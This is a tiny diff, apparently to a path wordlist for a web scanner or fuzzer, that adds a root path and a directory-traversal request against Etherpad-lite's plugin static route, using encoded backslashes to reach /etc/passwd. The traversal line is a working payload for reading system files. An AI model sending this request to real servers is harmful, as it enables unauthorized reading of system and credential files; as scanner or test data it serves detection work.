@@ -1,1 +1,3 @@
 /Admin
+/
+/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd
